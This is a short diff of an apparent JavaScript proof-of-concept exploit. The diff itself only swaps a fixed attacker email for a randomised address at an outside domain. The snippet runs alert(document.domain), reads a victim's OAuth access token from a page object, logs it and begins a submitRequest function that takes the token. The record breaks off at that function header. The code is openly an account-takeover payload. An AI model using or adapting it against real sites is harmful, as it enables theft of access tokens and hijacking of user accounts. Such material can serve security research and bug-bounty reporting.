@@ -1,7 +1,7 @@
 alert(document.domain);
 
 const oa2_token = create_dynamic_user_info.access_token;
-const attacker_email = "x+2@khara.one";
+const attacker_email = ""+(Math.random() + 1).toString(36).substring(7)+"@khara.one";
 console.log( oa2_token );
 
 function submitRequest( oa2_token )
